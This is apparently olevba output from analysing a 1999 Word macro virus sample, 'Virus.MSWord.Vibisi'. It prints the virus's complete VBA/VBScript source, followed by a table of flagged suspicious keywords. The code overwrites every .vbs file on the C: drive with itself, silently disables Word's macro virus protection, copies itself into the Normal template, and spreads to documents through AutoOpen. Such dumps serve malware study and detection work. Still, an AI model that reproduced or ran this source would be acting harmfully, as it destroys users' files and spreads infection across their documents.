olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Vibisi 
in file: Virus.MSWord.Vibisi - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Name:	Word97/VBScript.Gomez
Author: jack twoflower LineZer0/Metaphase
Date:	July 1999
----------------------------------------->


call vibisi
Sub vibisi()
On Error Resume Next
Dim fso, f, wo

Set fso = CreateObject("scripting.filesystemobject")
Set f = fso.opentextfile(wscript.scriptfullname, 1)

code = f.readall

Set wo = CreateObject("word.application")

With wo.Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "*.vbs"
        .Execute
End With

Set f = Nothing

For i = 1 To wo.Application.FileSearch.foundfiles.Count
        Set f = fso.opentextfile(wo.Application.FileSearch.foundfiles(i), 2, True)
        f.writeline code
Next

wo.options.virusprotection = (rnd * 0)
wo.options.savenormalprompt = (rnd * 0)

wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs"
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1
wo.NormalTemplate.save
wo.quit

End Sub

Sub autoopen()
On Error Resume Next

options.virusprotection = (rnd * 0)
options.savenormalprompt = (rnd * 0)

ThisDocument.VBProject.VBComponents("vbs").Export "c:\scriptO8.ini"

If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini"

If Len(activedocument.VBProject.VBComponents("vbs").Name) = 0 Then
        activedocument.VBProject.VBComponents.Import "c:\scriptO8.ini"
        activedocument.saveas activedocument.fullname
End If

With Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = true
        .FileName = "*.vbs"
        .Execute
End With

For x = 1 To Application.FileSearch.foundfiles.Count
        Set fso = CreateObject("scripting.filesystemobject")
        Set f = fso.opentextfile(Application.FileSearch.foundfiles(x), 2, True)
        codex = "call vibisi" & Chr(13) & ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(1, ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines)
        f.write codex
Next

End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

